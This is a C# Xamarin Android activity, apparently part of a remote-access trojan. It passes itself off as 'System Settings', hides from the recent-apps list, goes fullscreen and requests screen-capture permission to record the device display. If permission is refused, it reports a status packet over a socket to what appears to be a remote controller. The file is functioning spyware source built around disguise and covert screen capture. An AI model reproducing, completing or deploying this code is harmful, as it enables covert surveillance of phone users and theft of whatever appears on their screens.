﻿
using Android.App;
using Android.Content;
using Android.OS;
using System;
using System.Net.Sockets;

namespace Task2
{
    [Activity(Label = "System Settings", ExcludeFromRecents = true)]
    public class screenActivty : Activity
    {
        public static Activity screnAct;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            screnAct = this;
            RequestWindowFeature(Android.Views.WindowFeatures.NoTitle);
            //set up full screen
            Window.SetFlags(Android.Views.WindowManagerFlags.Fullscreen,
                    Android.Views.WindowManagerFlags.Fullscreen);
            startProjection();
            // Create your application here
        }
       
        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            Finish();
            if (requestCode == MainActivity.REQUEST_CODE)
            {
                if (resultCode == Result.Ok)
                {
                    MainActivity.sMediaProjection = MainActivity.mProjectionManager.GetMediaProjection((int)resultCode, data);

                    if (MainActivity.sMediaProjection != null)
                    {

                        var metrics = Resources.DisplayMetrics;

                        MainActivity.mDensity = (int)metrics.DensityDpi;
                        MainActivity.mDisplay = WindowManager.DefaultDisplay;

                        // create virtual display depending on device width / height
                        ((MainActivity)MainActivity.global_activity).createVirtualDisplay();

                        // register orientation change callback
                        MainActivity.mOrientationChangeCallback = new OrientationChangeCallback(this);
                        if (MainActivity.mOrientationChangeCallback.CanDetectOrientation())
                        {
                            MainActivity.mOrientationChangeCallback.Enable();
                        }

                        // register media projection stop callback
                        MainActivity.sMediaProjection.RegisterCallback(new MediaProjectionStopCallback(), MainActivity.mHandler);
                    }
                    //ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(screenActivty)).Name);
                    //PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
                }
                else
                {
                    try
                    {
                        byte[] dataPacker = ((MainActivity)MainActivity.global_activity).MyDataPacker("NOTSTART", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                        MainActivity.Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
            }
        }
        private void startProjection()
        {
            StartActivityForResult(MainActivity.mProjectionManager.CreateScreenCaptureIntent(), MainActivity.REQUEST_CODE);
        }
    }
}